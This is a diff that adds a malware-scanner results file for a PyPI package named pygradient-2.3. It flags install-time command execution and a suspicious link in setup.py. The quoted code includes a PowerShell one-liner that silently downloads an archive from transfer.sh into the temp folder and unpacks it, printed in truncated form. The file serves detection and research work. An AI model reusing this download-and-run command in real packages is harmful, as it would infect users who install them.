@@ -1,0 +1,35 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:5",
+                "code": "    subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:9",
+                "code": "    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/eyRyPT/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive...ver.pyw\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:9",
+                "code": "    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/eyRyPT/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive...ver.pyw\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/pygradient-2.3"
+}
